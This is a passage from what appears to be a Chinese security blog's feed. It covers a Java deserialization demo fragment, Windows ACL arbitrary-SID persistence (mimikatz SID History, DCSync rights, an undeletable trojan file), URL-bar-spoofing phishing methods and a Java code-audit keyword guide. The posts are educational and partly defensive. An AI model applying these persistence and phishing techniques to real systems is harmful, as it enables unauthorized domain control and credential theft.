class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(o);  <span class="comment">//如果用的后面那种，则把o换成handler</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(f1);</span><br><span class="line"></span><br><span class="line">        f2.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考</p><p><a href="https://mp.weixin.qq.com/s/nQeJhlsEGAE7IlZt-zFDOw">https://mp.weixin.qq.com/s/nQeJhlsEGAE7IlZt-zFDOw</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ACL之任意SID利用</title>
      <link href="/2022/09/19/WindowsACL-%E4%BB%BB%E6%84%8FSID%E5%88%A9%E7%94%A8/"/>
      <url>/2022/09/19/WindowsACL-%E4%BB%BB%E6%84%8FSID%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="Windows-ACL"><a href="#Windows-ACL" class="headerlink" title="Windows ACL"></a>Windows ACL</h2><p>访问控制列表，<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists</a></p><p>Windows文件系统的访问控制列表 (ACL) 是附加到对象的权限列表。ACL 指定哪些用户或系统进程被授予访问对象的权限，以及允许对给定对象执行哪些操作。典型 ACL 中的每个条目都指定了一个主题和一个操作。例如，如果一个文件的 ACL 包含 (Alice, delete)，这将授予 Alice 删除该文件的权限。</p><h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><p>在为Windows安全对象添加ACL信息时，通常ACL中可选择和显示的都是Windows账户名称，但Windows系统实际是根据SID来识别不同账户的，因此也可以通过账户的SID为索引添加或修改文件ACL。<strong>实际上在添加或修改ACL时可以使用任意的SID值，即使该SID不存在。</strong></p><p>正常情况下通过GUI添加ACL时，用户无法添加当前主机搜索不到的账户，搜索的范围包含了所有当前主机和所在域的安全账户和账户组，因此无法添加不存在的用户。所以在编辑ACL时要想使用任意SID，要解决的第一个问题是如何直接写入SID。</p><p>C#的库System.Security.AccessControl可以提供对ACL操作的支持，而且可以通过指定SID修改ACL信息，借助该库可以实现ACL注入任意SID。当一个不存在的SID构造后，会显示未知账户</p><p><img src="1663515267248-7c4284f4-c9ef-475d-87d1-f41e5965333d.png" alt="img"></p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="1-SID预测"><a href="#1-SID预测" class="headerlink" title="1.SID预测"></a>1.SID预测</h3><p>注入任意SID的一种利用方法是通过预测未来的SID实现权限维持，使用下述powershell命令查看当前域SID的序列。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(([adsisearcher]&quot;(objectSid=*)&quot;).FindAll()).Properties.objectsid | ForEach-Object &#123;(New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value&#125;</span><br></pre></td></tr></table></figure><p><img src="1663515441764-99cf331f-9c41-48a1-a1f6-fd7f89f15390.png" alt="img"></p><p>由于SID为自动编号的值，根据现有的账户SID值加1即为下一个新账户的SID为S-1-5-21-617395494-2047742401-2013338591-1168，在1.txt中为1168写入一条ACL并授予其完全访问控制权限，由于目前该SID的账户还不存在，因此系统无法识别该账户只显示SID</p><p><img src="1663515604587-e871b3a4-9f98-47e9-91f9-aa6e0208799d.png" alt="img"></p><p>若创建一个新的账户将会占用这个SID，之前的SID变成刚刚创建的新账户名称。</p><p><img src="1663515614703-14ac8607-5d53-4517-9046-580061843a1d.png" alt="img"></p><h3 id="2-利用已删除账户SID"><a href="#2-利用已删除账户SID" class="headerlink" title="2.利用已删除账户SID"></a>2.利用已删除账户SID</h3><h4 id="2-1-影子账户"><a href="#2-1-影子账户" class="headerlink" title="2.1.影子账户"></a>2.1.影子账户</h4><p>影子账户是一种比较古老的SID相关攻击，简述一下就是通过将账户A的注册表信息复制到账户B后，操作系统会将账户B当作账户A，账户B就像账户A的影子一样，故称影子账户。</p><p>如果把账户A的注册表信息保存下来，然后删除账户A，那么账户A相关的ACL信息都无效，但是只需将账户A的注册表信息复制到账户B，那么原有的账户B会继承账户A的权限。</p><p>以往这个攻击方法的缺陷是新建的安全对象无法添加已删除账户A的ACL，但是结合任意SID注入ACL可以弥补这个缺点。</p><h4 id="2-2-SID-History"><a href="#2-2-SID-History" class="headerlink" title="2.2.SID History"></a>2.2.SID History</h4><p>SID History相当于用户的第二个SID，是域环境中的一个传统的权限维持手段。<strong>SID History字段也可以写入任意SID</strong>。将已删除的SID写入安全对象的ACL中，因为账户被删除，ACL无效，然后通过<strong>将已删除账户A的SID写入账户B的SID History，则账户B会继承该已删除账户A的权限</strong>，使得被删除的ACL成为账户B的ACL。将SID History与任意SID注入可以实现进一步的隐匿，与影子账户的效果类似。</p><p>可通过mimikatz写入SID History</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sid::add /sam:[object-account] /new:[FAKE-SID]</span><br></pre></td></tr></table></figure><p><img src="1663516419274-01ce443d-4d9e-4b31-a9eb-869eda87f8a1.png" alt="img"></p><h2 id="利用面"><a href="#利用面" class="headerlink" title="利用面"></a>利用面</h2><h3 id="1-权限维持"><a href="#1-权限维持" class="headerlink" title="1.权限维持"></a>1.权限维持</h3><p>在AD域中结合对活动目录注入任意SID的ACL可以实现权限维持，具体的活动目录对象和权限可以根据自身的需求选择，以下是几个示例：</p><p>1.高权限组如Domain Admins组的账户CreateChild权限，可将任意账户添加为域管理员</p><p>2.域的DS-Replication-Get-Changes、DS-Replication-Get-Changes-All和DS-Replication-Get-Changes-In-Filtered-Set权限，可以进行DCSync攻击</p><p>3.任意域管理员账户的User-Force-Change-Password权限，可直接重置域管理员的密码</p><p>例如用新建的域内用户1170（继承的权限）的DS-Replication-Get-Changes-In-Filtered-Set权限进行DCSync攻击</p><p><img src="1663516873886-d3f5b6f6-d6f5-4390-947d-5b102f43d62c.png" alt="img"></p><h3 id="2-变形不死马"><a href="#2-变形不死马" class="headerlink" title="2.变形不死马"></a>2.变形不死马</h3><p>操作：</p><p>1.在木马文件中插入未知SID的ACL信息</p><p>2.删除文件的继承权限</p><p>3.删除其他SID的ACL信息</p><p>4.修改文件的所有者</p><p>完成上述操作后，该文件无法被任何人查看修改或删除。只有当插入的SID生效时才能显示所有者，通过控制插入SID的账户可以操作该文件。</p><p><strong>但是该文件并非真正的不死马，因为在Windows系统中本地管理员可以强制修改文件的所有者</strong>，一旦成为了文件的所有者就可以查看和编辑ACL信息。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼页面之无视浏览器URL栏</title>
      <link href="/2022/09/18/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F/"/>
      <url>/2022/09/18/%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="域名劫持（Domain-Takeover）"><a href="#域名劫持（Domain-Takeover）" class="headerlink" title="域名劫持（Domain Takeover）"></a>域名劫持（Domain Takeover）</h2><p>域名解析由DNS协议完成，包含了多种记录类型，比如其中的A (Address) 记录是用来指定主机名（或域名）对应的IP地址记录；NS记录，解析服务器记录，用来表明由哪台服务器对该域名进行解析；而CNAME记录通常也叫别名记录，是一种将一个域名映射到另一个域名的记录。</p><p>攻击者可采用各种社工欺骗的手法、或者利用受害者未及时修改的cname记录，达到控制域名或者相关子域名的效果。</p><h2 id="标签劫持（Tabnabbing）"><a href="#标签劫持（Tabnabbing）" class="headerlink" title="标签劫持（Tabnabbing）"></a>标签劫持（Tabnabbing）</h2><p>标签钓鱼是基于web的客户端攻击。这种攻击利用的是网站页面跳转的正常功能和用户对于标签页的疏忽。</p><p><strong>攻击展示</strong></p><p>借用github公开代码 <a href="https://github.com/securelayer7/Tabnabbing">https://github.com/securelayer7/Tabnabbing</a></p><ol><li>首先，攻击者构造受害者感兴趣的网站内容，并诱导其访问其它网站（如：诱导用户点击分享按钮）。</li></ol><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506658399-5c4fb25d-2d22-46d6-a505-a0ad37cd19ab.png" alt="img"></p><ol start="2"><li>受害者点击分享按钮后，页面将会在新的标签页显示正常的网页，此时，受害者看到的url栏为正常的官方域名，并坚信这是官方网站。</li></ol><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506678924-f98d17bb-3705-46c9-bc48-379ce575ceda.png" alt="img"></p><ol start="3"><li>但是当受害者在这<strong>个页面上停留几秒，或者浏览新标签，此网站页面将会跳转到钓鱼网站</strong>，受害者稍不注意就会毫不犹豫在一模一样的钓鱼页面输入账号密码。</li></ol><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506711344-4fe60de6-eb4e-44fc-9cd7-55675cb80d38.png" alt="img"></p><h2 id="OAUTH钓鱼"><a href="#OAUTH钓鱼" class="headerlink" title="OAUTH钓鱼"></a>OAUTH钓鱼</h2><p>OAUTH（Open Authorization）协议为用户资源的授权提供了一个安全的、开放而又简易的标准。互联网很多服务如Open API，很多大公司如Google，Yahoo，Microsoft等都提供了OAUTH认证服务</p><p>OAUTH授权有如下几个阶段，如图</p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506794423-7b0435b4-31d3-4e45-b34e-454021e51023.png" alt="img"></p><p>同时，任何第三方都可以使用OAUTH认证服务，任何服务提供商都可以实现自身的OAUTH认证服务。</p><p><strong>“钓鱼页面”为官方授权页面，攻击者无需用户伪造网站url，而是通过官方的认证服务索取受害者的账号控制权限。</strong></p><p>攻击者注册合法的第三方OAUTH服务器，通过发送正常的授权url，诱导受害者点击允许。如图，为微软账号和gmail的OAUTH的授权页面，受害者点击允许后，攻击者会获得授权码，进而接管账户权限。</p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506850291-62a34cbb-3042-4eb9-b61e-cd06d35db14e.png" alt="img"></p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506861324-0eaf13d5-f326-47a9-95a9-239a5866554b.png" alt="img"></p><h2 id="滚动钓鱼（The-inception-bar）"><a href="#滚动钓鱼（The-inception-bar）" class="headerlink" title="滚动钓鱼（The inception bar）"></a>滚动钓鱼（The inception bar）</h2><p><strong>什么是滚动钓鱼</strong></p><p>该方法利用用户在使用<strong>移动版本chrome浏览器</strong>时，<strong>页面向下滚动自动隐藏的特性进行url栏欺骗</strong>。开发人员 Jim Fisher 在其个人博客进行实验，展示了它的工作方式。<strong>当页面向下滚动时，浏览器会隐藏 URL 栏</strong>，为网页腾出更多空间。当页面向上滚动时，Chrome 会重新显示网址栏。</p><p><strong>但作者通过“滚动监狱”的方式欺骗chrome，并且让用户误会以为页面在向上滚动。</strong></p><p>这里，假URL栏使用了id为fakeurlbar的div标签，并将CSS设定为position: fixed，将其固定在最上方。</p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506945564-3dddc7ec-f3a7-4da5-91b3-5f49bf252bea.png" alt="img"></p><p>然后，作者在body中制作了一个div标签，将其设定为overflow: scroll，并往里面放一个高为1000px的填充元素，结合js让受害者永远在div里面，而不可能真的向上滑动。</p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663506961831-b4f87ec1-b4de-47a1-9518-87b7d8c559e4.png" alt="img"></p><p><strong>演示</strong></p><p><a href="https://d33wubrfki0l68.cloudfront.net/783bd862c3df19b6fb4eac0b4f687d598c957891/a3915/assets/2019-04-27/demo.webm">https://d33wubrfki0l68.cloudfront.net/783bd862c3df19b6fb4eac0b4f687d598c957891/a3915/assets/2019-04-27/demo.webm</a></p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663505719855-ea7a0302-ba28-47fa-b927-b3bb325fb6ed.gif" alt="img"></p><h2 id="全屏api钓鱼"><a href="#全屏api钓鱼" class="headerlink" title="全屏api钓鱼"></a>全屏api钓鱼</h2><p><strong>什么是全屏api</strong></p><p>FullScreen API 是一个html5 API，简单而又强大。FullScreen 让我们可以通过编程的方式来向用户请求全屏显示，如果交互完成,随时可以退出全屏状态。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//找到支持的方法，使用需要全屏的eLement调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">launchFul1screen</span>(<span class="params">element</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (element.requestFullscreen) &#123;</span><br><span class="line">    element.<span class="title function_ invoke__">requestFullscreen</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.mozRequestFullscreen) &#123;</span><br><span class="line">    element.<span class="title function_ invoke__">mozRequestFullscreen</span>( );</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.webkitRequestFullscreen)&#123;</span><br><span class="line">    element.<span class="title function_ invoke__">webkitRequestFullscreen</span>( );</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.msRequestFullscreen) &#123;</span><br><span class="line">    element.<span class="title function_ invoke__">msRequestFullscreen</span>( );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在支持全屏的浏览器中启动全屏</span></span><br><span class="line"><span class="title function_ invoke__">launchFullscreen</span>(document.documentElement);</span><br><span class="line"><span class="comment">//某个元素</span></span><br><span class="line"><span class="title function_ invoke__">launchFullscreen</span>( document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;videoElement&quot;</span> ));</span><br><span class="line"><span class="comment">//退出fullscreen</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exitFullscreen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (document.exitFullscreen) &#123;</span><br><span class="line">    document.<span class="title function_ invoke__">exitFullscreen</span>( );</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (document.mozExitFullscreen) &#123;</span><br><span class="line">    document.<span class="title function_ invoke__">mozExitFullscreen</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (document.webkitExitFullscreen)&#123;</span><br><span class="line">    document.<span class="title function_ invoke__">webkitExitFullscreen</span>( );</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//调用退出全屏方法</span></span><br><span class="line"><span class="title function_ invoke__">exitFullscreen</span>( );</span><br></pre></td></tr></table></figure><p>重点是，<strong>全屏后的页面可以隐藏原本的浏览器url栏，当攻击者欺骗目标点击全屏按钮后，攻击者可以显示其伪造的url栏以及任意的url地址。</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22207390/1663505720297-d6f79b18-3989-405c-afe5-e53653689df1.png" alt="img"></p><p><strong>攻击场景</strong></p><ol><li>攻击者伪造网站内容，诱导受害者点击伪造的全屏按钮。</li></ol><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663507434391-763f623e-e71a-476d-9604-11566892c9b4.png" alt="img"></p><ol start="2"><li>受害者点击 “access to your office365”，则全屏显示伪造好的浏览器url栏和钓鱼页面</li></ol><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663507446709-d1f362c6-6408-40d8-92c9-1674080a8ef9.png" alt="img"></p><ol start="3"><li>js判断受害者的浏览器，显示对应的浏览器url栏</li></ol><p>（浏览器为firefox时，显示如图）</p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663507460638-8ef53ae4-0cb4-40c5-944f-d84574e66f36.png" alt="img"></p><p>（移动端，显示如图）</p><p><img src="%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2%E4%B9%8B%E6%97%A0%E8%A7%86%E6%B5%8F%E8%A7%88%E5%99%A8URL%E6%A0%8F%5C1663507471911-ae2cee56-5ffd-4d0b-ba01-26c761c30a39.png" alt="img"></p><ol start="4"><li>受害者键入凭据后，账号被接管。</li></ol><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ol><li>当网站存在漏洞，如：xss、链接跳转等漏洞，也能被攻击者利用进行钓鱼攻击，而无需伪造浏览器url，用户在<strong>判断钓鱼网站时，不能寄希望于网站链接，应该更加注重网址来源是否可信</strong>。</li><li>建议<strong>自行输入网址打开需要输入凭据或者下载软件的网站，绝对不要将凭据或私钥输入通过点击链接到达的网站中。</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA代码审计</title>
      <link href="/2022/09/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/09/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<hr><p>和Php审计的思路一样</p><p>1.正向跟踪</p><p>从数据层查找变量，一级一级调用，最后到控制器，这种相对简单、快速。</p><p>2.逆向思维，追踪变量，对象调用</p><p>查找变量，有没有传参数，是谁调用了这个变量，又是谁调用了这个方法，先从控制器找变量，然后逆着找方法，调用关系，最后到DAO层数据。这种方法一般比较浪费时间，跟踪到最后可能发现变量不可控。</p><p>3.直接挖掘漏洞点</p><p>比如搭建后，访问平台，发现有上传的功能，直接去控制器找上传相关代码，进行审计。</p><p>4.通读全文代码</p><p>这是最纯粹、最直接、最难的方式。但是可能会遇到一个问题——看不懂代码。</p><h2 id="关键字定位"><a href="#关键字定位" class="headerlink" title="关键字定位"></a>关键字定位</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>大多数JavaEE网站，用的相对多的是SpringMVC架构，那么用到的Mybatis框架就会比较多，所以搜索SQL关键字就是”${}”优先，其次是以下的关键字。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#125;</span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">insert</span><br><span class="line">update</span><br><span class="line">in</span><br><span class="line">like</span><br><span class="line">obderby</span><br><span class="line">statement</span><br></pre></td></tr></table></figure><p>如果是SpringBoot ，可能会使用注解等方式，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@query(selectid from user where name = ?);</span><br></pre></td></tr></table></figure><p>以上语句写了”？”，则代表是预编译语句，就不会产生注入，如果写的是变量，就可能产生注入了。 </p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>在文件上传功能中，先看框架——比如<strong>Spring框架，默认不会解析jsp文件，要执行就要添加解析库</strong>，详情如下例子 <strong>任意文件上传</strong> 所示。然后看代码有没有定义黑名单数组等等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.comons.fileupload</span><br><span class="line">file</span><br><span class="line">xxxstream</span><br><span class="line">RequestMethod</span><br><span class="line">MultipartHttpServletRequest</span><br></pre></td></tr></table></figure><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getParamter</span><br><span class="line">&lt;%=</span><br><span class="line">param</span><br><span class="line">el表达式</span><br></pre></td></tr></table></figure><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path</span><br><span class="line">System.GetProperty(<span class="string">&quot;yser.dir&quot;</span>)</span><br><span class="line">fileInputStream</span><br><span class="line">file.read</span><br><span class="line">filePath</span><br></pre></td></tr></table></figure><h3 id="xml注入类似xxe"><a href="#xml注入类似xxe" class="headerlink" title="xml注入类似xxe"></a>xml注入类似xxe</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilder</span><br><span class="line">XMLStreamReader</span><br><span class="line">SAXBuilder</span><br><span class="line">SAXParserSAXReader </span><br><span class="line">XMLReader</span><br><span class="line">SAXSource</span><br><span class="line">TransformerFactory</span><br><span class="line">SAXTransformerFactory</span><br><span class="line">SchemaFactory</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder</span><br><span class="line">start</span><br><span class="line">Runtime</span><br><span class="line">getRuntime</span><br><span class="line">exec</span><br></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readObject</span><br><span class="line">readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a><strong>任意文件删除</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete</span><br></pre></td></tr></table></figure><h2 id="MVC模式"><a href="#MVC模式" class="headerlink" title="MVC模式"></a><strong>MVC模式</strong></h2><p>MVC模式是一种软件框架模式，被广泛应用在JavaEE项目的开发中。</p><p>MVC即模型（Model）、视图（View）、控制器（Controller）。</p><h3 id="模型（Model）"><a href="#模型（Model）" class="headerlink" title="模型（Model）"></a>模型（Model）</h3><p>模型是用于处理数据逻辑的部分。所谓数据逻辑，也就是数据的映射以及对数据的增删改查，Bean、DAO（dataaccess object，数据访问对象）等都属于模型部分。</p><h3 id="视图（View）"><a href="#视图（View）" class="headerlink" title="视图（View）"></a>视图（View）</h3><p>视图负责数据与其它信息的显示，也就是给用户看到的页面。HTML、JSP等页面都可以作为视图。</p><h3 id="控制器（controller）"><a href="#控制器（controller）" class="headerlink" title="控制器（controller）"></a>控制器（controller）</h3><p>控制器是模型与视图之间的桥梁，控制着数据与用户的交互。控制器通常负责从视图读取数据，处理用户输入，并向模型发送数据，也可以从模型中读取数据，再发送给视图，由视图显示。</p><h3 id="项目整体结构"><a href="#项目整体结构" class="headerlink" title="项目整体结构"></a>项目整体结构</h3><p>首先要了解项目整体结构。大致了解作者编写逻辑，搞清请求流程。</p><p><strong>src&#x2F;main下面有两个目录，分别是java和resources</strong>，java目录中主要存放的是java代码，resources目录中主要存放的是资源文件，比如：html、js、css等。</p><p>在Java目录和resources目录下还有其他一些常见目录，具体含义整理如下：</p><p><strong>&#x2F;java目录下</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">annotation：放置项目自定义注解；</span><br><span class="line">controller/: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等；</span><br><span class="line">dao/: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口；</span><br><span class="line">entity/: 存放实体类；</span><br><span class="line">interceptor/: 拦截器；</span><br><span class="line">service/:存放服务类，负责业务模块逻辑处理。Service层中有两种类，一是Service，用来声明接口；二是ServiceImpl，作为实现类实现接口中的方法；</span><br><span class="line">utils/: 存放工具类；</span><br><span class="line">dto/: 存放数据传输对象（DataTransfer Object），如请求参数和返回结果；</span><br><span class="line">vo/: 视图对象（ViewObject）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</span><br><span class="line">constant/: 存放常量；</span><br><span class="line">filter/: 存放过滤器。</span><br></pre></td></tr></table></figure><p><strong>&#x2F;resources目录下</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mapper/：存放Mybaits的mapper.xml文件；</span><br><span class="line">static/：存放静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问；</span><br><span class="line">templates/: 存放模版文件；</span><br><span class="line">application.properties或application.yml:Spring Boot：默认配置文件。</span><br></pre></td></tr></table></figure><h3 id="代码跟踪流程"><a href="#代码跟踪流程" class="headerlink" title="代码跟踪流程"></a>代码跟踪流程</h3><p>用户请求URL发送到服务器，服务器解析请求后发送到后端代码处理请求。</p><p>在后端代码处，首先经过Filter(过滤器)和Interceptor(拦截器)，然后根据请求的URL映射到绑定的Controller，之后调用Service接口类，然后再调用serviceImpl接口实现类，最后调用DAO。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">controller：负责简单的逻辑处理和参数校验功能，之后调用Service；</span><br><span class="line">service：接口类，主要负责业务模块逻辑处理；</span><br><span class="line">serviceImpl：接口实现类，实现类实现service接口中的方法；</span><br><span class="line">DAO：如果service涉及数据库操作就会调用DAO。DAO主要处理数据库操作。DAO只做中间传递角色</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="https://mp.weixin.qq.com/s/jJ3iBNUnFFJOgJnf5mJ6TQ">https://mp.weixin.qq.com/s/jJ3iBNUnFFJOgJnf5mJ6TQ</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>以某项目为例。配置maven环境，更改中文镜像：</p><p><img 